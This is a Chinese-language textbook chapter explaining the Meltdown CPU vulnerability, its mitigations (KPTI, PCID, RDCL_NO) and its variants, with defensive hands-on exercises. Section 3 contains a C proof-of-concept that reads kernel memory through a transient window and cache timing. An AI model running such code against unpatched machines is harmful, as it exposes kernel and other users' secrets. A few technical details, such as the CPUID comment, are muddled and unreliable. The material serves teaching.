# Ch 18 — Meltdown (Rogue Data Cache Load)

> **目標**：深入理解 CVE-2017-5754 的核心機制——Intel CPU 在發出推測性記憶體存取後、延遲做頁表權限檢查的設計缺陷，以及這個視窗如何讓任意 user-space process 讀出全部 kernel 記憶體；掌握 KPTI 防禦的代價與運作原理；能在現代已修補硬體上正確解讀 sysfs 輸出並說明「為何這台機器不受影響」。

---

## 一、事件背景

2018 年 1 月 3 日，Google Project Zero（Jann Horn）、Cyberus Technology（Werner Haas、Thomas Prescher）和 TU Graz（Moritz Lipp、Michael Schwarz、Daniel Gruss 等人）同時公開兩篇論文：Meltdown 與 Spectre。這是處理器微架構安全研究史上影響最廣的一次揭露，CVE 編號 CVE-2017-5754 早在 2017 年底私下通報時已分配完畢。

Meltdown 的破壞性在於它不需要任何 victim code、不需要訓練任何預測器、不需要 root 權限——只要一個普通 user-space process，就能以每秒數 KB 的速度從 kernel address space 讀任意位元組。在未打補丁的 2018 年前雲端環境中，這意味著 VM 可以讀出 hypervisor 記憶體、讀出鄰居 VM 的資料。

本章機器（Intel i7-10700, Comet Lake, 2020）硬體已內建修補，sysfs 回報 `Not affected`。所有 PoC 程式碼討論均標記為【未實測，理論預期】並附重現條件。

---

## 二、核心漏洞：推測執行與延遲的權限檢查

### 2.1 正常情況下 CPU 應該做什麼

x86 架構的頁表項（Page Table Entry, PTE）中有一個 U/S bit（User/Supervisor bit）：

```
PTE bit layout (simplified):
 63      52 51    12 11  9  8  7  6  5  4  3  2  1  0
 +--------+--------+------+--+--+--+--+--+--+--+--+--+
 |  NX/XD | PFN   |  AVL |G |PS|D |A |PCD|PWT|U/S|RW|P|
 +--------+--------+------+--+--+--+--+--+--+--+--+--+
                                               ^
                                               U/S = 0 → Supervisor only
                                               U/S = 1 → User accessible
```

當 user-space（CPL=3）嘗試存取 U/S=0 的頁面時，CPU 應該立刻觸發 #PF（Page Fault，exception 14），不允許存取發生。

「應該」是架構層（architectural level）的語意。問題出在微架構層（microarchitectural level）的實作。

### 2.2 Intel 的推測執行設計與致命的時間差

現代 out-of-order CPU 的 load 指令不是原子的：它被拆成「發出 load 請求到 memory subsystem」和「提交結果到架構狀態（retirement）」兩個階段，中間隔著數十個 cycle。

**Pre-Comet Lake Intel 的行為**（漏洞所在）：

```
CPU 流水線視角：

t=0   執行 mov al, byte [rbx]
      → Load Buffer 發出對 rbx 位址的 load 請求
      → 此時 U/S 檢查尚未完成（或尚未阻止後續 uop 發出）

t=1   Load 資料從 L1/L2/L3/RAM 回來（推測值）
      → CPU 樂觀地把 al 設為推測值
      → 後續相依指令 shl rax, 12 可以繼續發射（issue）

t=2   shl rax, 12  ← 用推測的 al 算出 rax
t=3   mov rcx, [probe_array + rax]
      ← probe_array[secret_byte * 4096] 被帶入 L1 cache！

t=4   U/S 檢查完成 → 發現違規 → 觸發 #PF
      → CPU 開始 retirement 回滾
      → 架構暫存器 rax、al 回到 undefined/0
      → 但 L1 cache 的狀態不會回滾！

t=5   Exception handler 接管，程式從 signal handler 繼續

攻擊者接下來做 Reload：
  for i in 0..255:
    t_start = rdtsc
    _ = probe_array[i * 4096]
    t_end = rdtsc
    if (t_end - t_start) < CACHE_HIT_THRESHOLD:
      secret_byte = i   ← 找到了
```

關鍵洞見：**架構回滾只重置暫存器和記憶體可見狀態；cache 是微架構狀態，不在回滾範圍內。** 這個不對稱性正是所有 transient execution 攻擊的根基。

### 2.3 完整攻擊時間線（ASCII 圖）

```
User-space process                 CPU Pipeline                  Cache
──────────────────                 ────────────                  ─────
                                                           probe[0..255*4096]
STEP 1: Flush
for i in 0..255:
  clflush(probe[i*4096])  ──────> TLB/cache flush               全部 cold

STEP 2: Transient Window
mov rbx, 0xffff888000000000       (kernel direct map 起點)
mov al, byte [rbx]        ──────> Load 發出 ──────────────>     L1 miss
                                  ↓ (資料回來，al=secret)
shl rax, 12               ──────> 推測執行 al*4096
mov rcx, [probe+rax]      ──────> 推測 load probe[secret*4096]  probe[s*4096] HOT!
                                  ↓ #PF 觸發，rax=0 回滾
signal handler 恢復

STEP 3: Reload
for i in 0..255:
  t = rdtsc_timing(probe[i*4096])
  if t < 100 cycles:
    print("secret byte =", i)  ←────────────────────────────── cache hit!
```

---

## 三、攻擊程式碼結構【未實測，理論預期】

以下程式碼展示 Meltdown 概念實作。**此程式在已修補的 i7-10700 上執行不會洩漏任何資料**（推測執行在 U/S 違規時不再繼續），僅供理解攻擊結構。

**重現條件**：Intel Core 2 到第 8/9 代（Coffee Lake 含）處理器；Linux kernel 未載入 KPTI（`nopti` kernel cmdline）；微碼版本早於 2018 年 1 月補丁（無 RDCL_NO CPUID bit）。已驗證平台：Ubuntu 16.04 on Core i7-6700K / i7-7700K。

```c
/* meltdown_poc.c — 【未實測，理論預期】
 * 需要：pre-Ice Lake Intel CPU + nopti kernel cmdline + pre-2018 microcode
 * 編譯: gcc -O0 -o meltdown_poc meltdown_poc.c
 */
#include <signal.h>
#include <setjmp.h>
#include <stdint.h>
#include <x86intrin.h>

#define PROBE_SIZE 256
#define PAGE_SIZE  4096
#define CACHE_HIT  150

static uint8_t probe[PROBE_SIZE * PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
static jmp_buf jbuf;
static volatile uint8_t sink;

void sighandler(int s) { (void)s; longjmp(jbuf, 1); }

/* 核心：transient window */
static void meltdown_read(void *kaddr) {
    asm volatile(
        "xor %%rax, %%rax\n"
        "mov (%0), %%al\n"             /* #PF 在 retirement 才觸發；推測值已在 al */
        "shl $12, %%rax\n"
        "mov (%1, %%rax, 1), %%rax\n"  /* probe[secret*4096] 進 cache */
        : : "r"(kaddr), "r"(probe) : "rax", "memory");
}

int read_kernel_byte(void *kaddr) {
    signal(SIGSEGV, sighandler);
    int votes[256] = {0};
    for (int attempt = 0; attempt < 100; attempt++) {
        for (int i = 0; i < 256; i++) _mm_clflush(&probe[i * PAGE_SIZE]);
        _mm_mfence();
        if (setjmp(jbuf) == 0) meltdown_read(kaddr);
        /* Reload phase */
        for (int i = 0; i < 256; i++) {
            uint64_t t0 = __rdtsc();
            sink = probe[i * PAGE_SIZE];
            if ((__rdtsc() - t0) < CACHE_HIT) votes[i]++;
        }
    }
    int best = -1, max = 0;
    for (int i = 0; i < 256; i++) if (votes[i] > max) { max = votes[i]; best = i; }
    return best;
}
```

**關鍵組語**：`mov (%0), %%al` 觸發 #PF，但 #PF 在 retirement 才生效；有漏洞的 CPU 在 retirement 前就把推測的 `al` 值傳給後續指令，把 `probe[secret*4096]` 帶入 cache。已修補 CPU 的 U/S 檢查在 issue 階段即阻斷後續推測，`shl`/`mov` 無法使用推測值。

---

## 四、為何 Meltdown 比 Spectre 更直接

```
攻擊維度比較：

             Meltdown                    Spectre (v1/v2)
             ────────                    ───────────────
攻擊者角色   直接讀禁止的記憶體地址        找/注入 victim code 中的 gadget
需要 gadget  不需要                       需要在 victim 程序中找到適合的
             （攻擊者自己的程式碼就是）    條件分支 + 陣列存取序列
Victim code  不需要                       需要（Spectre v1 需訓練分支，
訓練          ——                          v2 需汙染間接跳轉目標）
特殊條件     U/S 延遲檢查的 Intel CPU     幾乎所有有推測執行的 CPU
修補方式     KPTI（kernel page table      compiler barrier, retpoline,
             isolation）                  IBRS/IBPB（分支預測器隔離）
修補成本     5-30% syscall overhead       視場景 0-15% overhead
```

Meltdown 的危險性在於攻擊者不需要了解 victim 的程式邏輯，任何 kernel 位址都可以直接讀。Linux kernel 的 `direct map`（`0xffff888000000000` 起的實體記憶體完整映射）讓攻擊者能讀出**整塊實體記憶體**。

---

## 五、可洩漏的資料

Linux 在 kernel space 維護實體記憶體的完整 direct mapping：

```
Linux x86_64 Virtual Address Space (pre-KPTI):

0x0000000000000000
  ↑ user space (0 ~ 0x00007fffffffffff)

0xffff888000000000  ← physmap start (direct map)
  所有實體記憶體映射在此，包含：
  - 其他 process 的 heap/stack（因為它們也在實體記憶體上）
  - kernel 本身的程式碼與資料
  - page tables
  - 其他 VM 的記憶體（雲端環境）

0xffffffff80000000  ← kernel text
0xffffffff81000000  ← kernel image

Meltdown 可讀的範圍 = 整個 kernel virtual address space
= 全部實體記憶體（透過 physmap）
```

具體可取得：keystroke buffer、TLS/SSH private key、其他 process 的 heap（透過 physmap）、AES round keys、其他 VM 的完整記憶體（雲端最嚴重）。

---

## 六、防禦：KPTI（Kernel Page Table Isolation）

KPTI 前身是 KAISER（Kernel Address Isolation to have Side-channels Efficiently Removed），TU Graz 2017 年為保護 KASLR 免於 cache side-channel 洩漏而提出；Meltdown 公開後立刻成為主要防禦。

### 6.1 KPTI 的運作原理

```
KPTI 前（每個 process 共用一份 page table）：

Process CR3 指向：
┌─────────────────────────────────┐
│ User-space mappings             │  CPL=3 可存取
│   (text, heap, stack, libs)     │
├─────────────────────────────────┤
│ Kernel-space mappings           │  CPL=0 才可存取（U/S=0）
│   (kernel text, physmap, etc.)  │  ← Meltdown 就是偷讀這裡
└─────────────────────────────────┘
問題：kernel 地址雖然 CPL=3 不能讀，
      但映射存在 → CPU 可以推測性地存取

──────────────────────────────────────────────

KPTI 後（兩份獨立 page table）：

User CR3 → User Page Table：
┌─────────────────────────────────┐
│ User-space mappings             │
├─────────────────────────────────┤
│ 極小 kernel stub                │  只有 syscall entry/exit、
│   (trampoline pages only)       │  interrupt handler stub
└─────────────────────────────────┘
Kernel 地址根本不在映射裡 → 無法推測性存取！

Kernel CR3 → Kernel Page Table：
┌─────────────────────────────────┐
│ User-space mappings             │
├─────────────────────────────────┤
│ 完整 kernel-space mappings      │
└─────────────────────────────────┘
```

### 6.3 KPTI 的代價

每次 syscall / interrupt 都需要切換 CR3（user CR3 ↔ kernel CR3），這會導致 TLB flush（因為不同 page table 的虛擬地址映射不同）。

```
Syscall 路徑（KPTI with PCID 優化）：

user code
  │
  │ syscall 指令
  ↓
trampoline page（存在於 user CR3）
  │ 切換 CR3 到 kernel CR3
  │ (PCID 讓 TLB 可以保留 user-space 的翻譯快取)
  ↓
kernel syscall handler
  │
  │ 處理完畢 sysret
  ↓
trampoline page（切換回 user CR3）
  │
  ↓
user code 繼續

CR3 切換成本：~few hundred cycles per switch
PCID 存在時：不需要完整 TLB flush，代價降低
```

**效能影響實測（2018 年 Intel，有漏洞 CPU，無 PCID）**：

| 工作負載 | Overhead |
|---|---|
| 純計算（無 syscall）| < 1% |
| syscall-heavy（`getpid` 微測試）| ~20-30% |
| 資料庫（PostgreSQL pgbench）| 7-17% |
| 網路 I/O（nginx）| 5-10% |
| 儲存 I/O（fio sequential）| 8-19% |
| 容器（syscall overhead 倍增）| 更高 |

### 6.4 PCID 優化

PCID（Process Context Identifier）是 CR3 低 12 bits 的 tag，讓 TLB 為不同 CR3 value 保留各自的 entry，避免每次切換都需要完整 TLB flush。有 PCID 的 CPU（Nehalem 後幾乎都有），KPTI overhead 降至 2-5%。

---

## 七、硬體修補：為何 i7-10700 不受影響

本機實際輸出（WSL2 + Ubuntu 22.04）：

```bash
$ cat /sys/devices/system/cpu/vulnerabilities/meltdown
Not affected
```

Intel 從 Ice Lake（第 10 代部分 SKU）和 Comet Lake（第 10 代主流，含 i7-10700）起，在硬體層修正了問題：CPU 在推測性執行 user→kernel 跨越的 load 時，**提前（在 issue 階段，而非 retirement）做 U/S 權限檢查**。一旦偵測到 CPL=3 存取 U/S=0 的頁面，推測執行立刻終止，不允許後續相依指令繼續，因此 transient window 根本不存在。

這個能力透過 CPUID 的 `RDCL_NO` bit 廣播出來：

```bash
# CPUID EAX=7, ECX=0, EDX bit 31 不是 RDCL_NO
# RDCL_NO 在 EAX=7, ECX=0, EDX bit 17 (IA32_ARCH_CAPABILITIES MSR)
# 實際應查 IA32_ARCH_CAPABILITIES MSR (0x10A), bit 0 = RDCL_NO

# 用 rdmsr 查（需要 msr kernel module）：
$ sudo modprobe msr
$ sudo rdmsr 0x10A
# bit 0 = 1 → RDCL_NO (Meltdown 硬體修補)
# bit 1 = 1 → IBRS_ALL (Spectre v2 硬體修補)
# bit 3 = 1 → SKIP_L1DFL_VMENTRY (L1TF 相關)

# 或用 cpuid 工具：
$ cpuid -1 -l 7 -s 0 | grep -i "rdcl\|arch_cap"
```

Intel 的命名：這個修補叫做「RDCL_NO」（Rogue Data Cache Load No，即「本 CPU 不受 Rogue Data Cache Load 影響」）。i7-10700 出廠時即設定此 bit，無需 microcode 補丁。

---

## 對比與取捨

| | Meltdown (CVE-2017-5754) | Spectre v1 (CVE-2017-5753) |
|---|---|---|
| 攻擊向量 | 直接讀 kernel 虛擬地址 | 訓練 branch predictor 後讀 victim memory |
| 需要 victim gadget | 不需要 | 需要（bounds-check bypass pattern）|
| 需要 victim 執行 | 不需要 | 需要（JIT/kernel 含 gadget 即可） |
| 受影響 CPU | Pre-Ice Lake Intel（主要）| 幾乎所有現代 CPU |
| AMD 影響 | 基本不受影響（見踩雷）| 受影響（AMD PSF 等）|
| ARM 影響 | Cortex-A75 等少數 | 廣泛受影響 |
| 防禦機制 | KPTI（軟體）/ RDCL_NO（硬體）| array_index_nospec、IBRS/IBPB、retpoline |
| 防禦成本 | 有 PCID 約 2-5%，無則 5-30% | 視工作負載 1-15% |
| PoC 複雜度 | 低（不需要 gadget hunting） | 中高（需分析 victim binary） |

---

## 踩雷集錦

**踩雷一：「AMD 免疫」是過度簡化。**

AMD 的說法是：AMD CPU 在推測性 load 違反權限時，會「fail silently and return zeros」——即回傳 0 而非真實資料，因此後續推測計算使用的是 0，Flush+Reload 看不到真實 secret。這在傳統 Meltdown-US（User→Supervisor）的場景成立。但 2020 年後的研究揭示了多個 Meltdown-type 變體（Meltdown-GP、Meltdown-NM、Meltdown-PK）在特定 AMD 微架構上存在，只是攻擊面比 Intel 窄得多。「AMD 完全免疫」這句話在嚴格意義上是錯的。

**踩雷二：KPTI 不能防禦 Spectre。**

KPTI 的核心是把 kernel 地址從 user page table 中移除，讓 kernel 地址在 CPL=3 時甚至不存在映射，因此推測執行無從觸發 kernel address 的 load。但 Spectre 根本不直接讀 kernel 地址——它訓練 victim（kernel）自己的 branch predictor，讓 victim **在 kernel 自己的地址空間內**執行 gadget，把資料 encode 到 cache。攻擊者從 user space 做 F+R 觀察結果。KPTI 對這條路徑毫無幫助。Spectre 的防禦是完全另一套：`array_index_nospec` barrier、IBRS/IBPB 清 branch predictor state、retpoline 替代間接跳轉。搞混兩者防禦是最常見的面試失分點。

**踩雷三：「回滾了所以沒洩漏」——最常見的直覺錯誤。**

許多人看到 CPU 回滾（rollback）就以為攻擊無效：「rax 被清回 0，什麼都沒發生。」這個直覺把 architectural state 和 microarchitectural state 混為一談。Architectural state 包含：暫存器、記憶體（對 load/store 架構可見的部分）。Microarchitectural state 包含：cache 內容、TLB entries、branch predictor state、load buffer 殘留。CPU 的回滾保證了架構正確性，但沒有任何承諾要清除微架構狀態。Cache 是效能最佳化的共享資源，清除它代價太高——而正是這個不對稱性使 transient execution 攻擊成為可能。這個直覺錯誤在 Spectre、MDS、LVI 等後續攻擊中反覆出現，根除它是學習這整個領域的第一步。

**踩雷四：Meltdown ≠ 一般 cache timing attack。**

有人以為「只要 CPU 夠慢或沒有 speculation，把陣列讀取放在 exception handler 之前也一樣洩漏」。不對。Meltdown 的關鍵不是 cache timing（那只是 decode 工具），而是**推測執行在 exception 觸發前繼續跑後續指令**。如果 CPU 在 load 發出後、結果回來前就嚴格 stall 所有後續指令（in-order CPU），`mov al, [kernel_addr]` 就只會產生 #PF，後續 `shl`/`mov probe` 根本沒機會執行，cache 上什麼都不會有。推測執行是必要條件，不只是加速器。

---

## 進階：再往深一層

### A. Meltdown-type 變體分類

Canella et al. 2019（USENIX Security）對 transient execution 攻擊做了系統性分類，Meltdown 一族根據觸發 fault 的類型命名：

```
Meltdown 分類（Canella 2019 命名法）：

Meltdown-US  (User→Supervisor)   原版 CVE-2017-5754
Meltdown-P   (Present bit = 0)   → L1TF (CVE-2018-3620, Ch 19)
Meltdown-GP  (General Protection) → 讀 MSR 等特權暫存器
Meltdown-NM  (Device Not Available) → x87/SSE lazy state restore
Meltdown-PK  (Protection Keys)   → Intel MPK bypass
Meltdown-BR  (Bounds Range Exceeded) → MPX bounds check bypass
Meltdown-RW  (Read/Write)        → 寫 read-only mapping

每個變體對應不同的 fault 條件，防禦和受影響 CPU 各不同。
```

### B. Transient Execution Window 的精確定義

「Transient window」是指從 load 發出（issue）到 fault 被 commited（retirement）之間，CPU 繼續執行後續指令的那段時間。Window 的長度取決於：
- L1 cache miss vs hit（miss 讓 window 更長，因為 load latency 更高，CPU 有更多時間推測執行後續指令）
- 微架構的 ROB（Reorder Buffer）深度
- 後續指令的 latency chain 是否能在 window 內完成

這解釋了一個實作細節：Meltdown PoC 通常會**故意讓 kernel 地址造成 cache miss**（clflush 掉），讓 load latency 拉長，增加後續推測指令完成的概率——增大攻擊成功率。

### C. SGX 與 Meltdown

Intel SGX（Software Guard Extensions）創建的 enclave 被設計為連 OS/hypervisor 都無法讀取的安全執行環境。Meltdown-P（Present bit clear 的版本，即 L1TF，下一章詳述）可以從 SGX enclave 外部讀取 enclave 記憶體——直接打穿 SGX 的核心安全保證。這讓 Meltdown 的影響超越了 OS 安全邊界，攻及硬體信任根。

---

## 動手練習

### 練習 1：驗證本機防禦狀態（真跑）

```bash
# 1. 查 sysfs 漏洞狀態
cat /sys/devices/system/cpu/vulnerabilities/meltdown
# 預期：Not affected

# 2. 確認 KPTI 是否啟用（即使不需要，kernel 可能仍啟用）
dmesg | grep -i "kpti\|pti\|kaiser"

# 3. 查 kernel cmdline 確認沒有 nopti
cat /proc/cmdline | grep -o 'nopti\|pti=off' || echo "KPTI not disabled"

# 4. 讀取 IA32_ARCH_CAPABILITIES MSR 確認 RDCL_NO
sudo modprobe msr 2>/dev/null
sudo python3 -c "
import struct
with open('/dev/cpu/0/msr', 'rb') as f:
    f.seek(0x10A)  # IA32_ARCH_CAPABILITIES
    val = struct.unpack('<Q', f.read(8))[0]
    print(f'IA32_ARCH_CAPABILITIES = 0x{val:016x}')
    print(f'RDCL_NO (bit 0) = {val & 1}')
    print(f'IBRS_ALL (bit 1) = {(val >> 1) & 1}')
    print(f'SKIP_L1DFL_VMENTRY (bit 3) = {(val >> 3) & 1}')
    print(f'MDS_NO (bit 5) = {(val >> 5) & 1}')
"
```

預期輸出（i7-10700）：
```
IA32_ARCH_CAPABILITIES = 0x000000000000002f
RDCL_NO (bit 0) = 1   ← Meltdown 硬體修補
IBRS_ALL (bit 1) = 1  ← Spectre v2 Enhanced IBRS
MDS_NO (bit 5) = 1    ← MDS 硬體修補
```

### 練習 2：觀察 KPTI 的 CR3 切換（效能影響）

```bash
# 用 perf 觀察 TLB flush 頻率（代理指標）
sudo perf stat -e dtlb_load_misses.miss_causes_a_walk,\
itlb_misses.miss_causes_a_walk \
-p $$ sleep 1

# 用 perf 量 syscall overhead（與無 KPTI 的理論對比）
# 在 KPTI 啟用的系統上：
perf bench sched messaging -t 10 -l 1000

# 量 getpid syscall latency（syscall-heavy 基準）
for i in $(seq 5); do
  time (for j in $(seq 100000); do cat /proc/version >/dev/null 2>&1; done)
done
```

### 練習 3：分析 Linux KPTI 原始碼

閱讀 <https://elixir.bootlin.com/linux/latest/source/arch/x86/mm/pti.c>，重點追蹤三個函數：`pti_init()`（啟動流程）、`pti_clone_kernel_text()`（把必要 kernel 頁面複製到 user page table）、`pti_set_kernel_image_nonglobal()`（讓 kernel 頁面不使用 global TLB entry，避免 KPTI 失效）。理解為何 trampoline pages 必須同時存在於 user 和 kernel page table。

---

## 本章重點整理

1. **Meltdown 的根本原因**：Intel pre-Comet Lake CPU 將 U/S 頁表權限檢查延遲到 retirement，讓 transient window 中的推測指令可以消費越權 load 的結果，並把它 encode 進 cache。

2. **洩漏路徑**：user space `mov al, [kernel_addr]` → CPU 推測執行後續指令 → `probe[secret*4096]` 進 cache → F+R decode → 取得 kernel byte。架構層 rollback 只重置暫存器；cache 不回滾。

3. **攻擊破壞力**：透過 Linux physmap，任何 user process 可讀出全部實體記憶體——其他 process 的 heap、kernel secrets、其他 VM 的記憶體、SGX enclave 內容。

4. **KPTI 防禦**：維護兩份 page table，user page table 不含 kernel 地址映射；kernel 地址不存在映射 = 推測執行無從觸發。代價是每次 syscall/interrupt 需 CR3 切換，有 PCID 的 CPU 可降低 TLB flush 成本。

5. **硬體修補**：Ice Lake / Comet Lake 起，Intel 在 issue 階段做 U/S 檢查，transient window 消失。透過 `IA32_ARCH_CAPABILITIES` MSR 的 `RDCL_NO` bit 廣播。i7-10700 硬體免疫，sysfs 回報 `Not affected`。

6. **Meltdown ≠ Spectre**：兩者機制不同，防禦完全不同，不能混用。KPTI 防 Meltdown、array_index_nospec + IBRS 防 Spectre v1/v2。

---

## 自我檢核

1. Meltdown 攻擊的「transient window」是從哪個時間點開始到哪個時間點結束？CPU 在這個 window 中能做什麼、不能做什麼？

2. 為什麼 L1 cache miss（clflush 掉 kernel 地址後造成的）反而**有利於** Meltdown 攻擊，而不是妨礙它？

3. KPTI 的 user page table 中為什麼還保留「tiny kernel stub」？完全拿掉不行嗎？

4. 解釋為什麼「architectural rollback 發生了，所以沒有資訊洩漏」這個推論是錯的。用「architectural state vs microarchitectural state」的框架回答。

5. AMD CPU 在面對傳統 Meltdown-US 時，即使推測執行繼續，為何 F+R 仍無法解碼出真實 secret？（提示：AMD 回傳了什麼？）

6. 你在 i7-10700 上執行一個完整的 Meltdown PoC（正確的 flush+read+reload 流程），結果每個 byte 都讀出 0 或是隨機雜訊。從微架構角度解釋這個現象。

---

## 延伸閱讀

- Lipp et al., "Meltdown: Reading Kernel Memory from User Space", USENIX Security 2018. <https://meltdownattack.com/meltdown.pdf> — 原始論文，Section 3 的微架構分析是必讀。

- Gruss et al., "KASLR is Dead: Long Live KASLR", ESSoS 2017. — KPTI/KAISER 的前驅工作，解釋為何 kernel 地址映射本身就是問題。

- Canella et al., "A Systematic Evaluation of Transient Execution Attacks and Defenses", USENIX Security 2019. — 對 Meltdown/Spectre 整個家族做系統性分類，引入統一命名法（Meltdown-US、Meltdown-P 等），是讀後續各章的最佳地圖。

- Linux kernel PTI 文件：<https://www.kernel.org/doc/html/latest/x86/pti.html> — 包含 KPTI 實作決策說明、PCID 優化，以及不同 CPU 的行為差異。

- Intel 安全公告 INTEL-SA-00088（Spectre/Meltdown）及 `IA32_ARCH_CAPABILITIES` MSR 規格（Intel SDM Volume 4, Chapter 2）。

---

下一章進入 Meltdown 的一個更隱蔽的變體——L1 Terminal Fault（L1TF）在 Page Not Present 的推測存取中如何繞過甚至 SGX 的防護，以及 MDS（Microarchitectural Data Sampling）如何把攻擊面從 cache 擴展到 CPU 內部的 fill buffer 和 store buffer。

→ [Ch 19 — MDS、L1TF 與 Foreshadow](19-mds-l1tf-foreshadow.md)
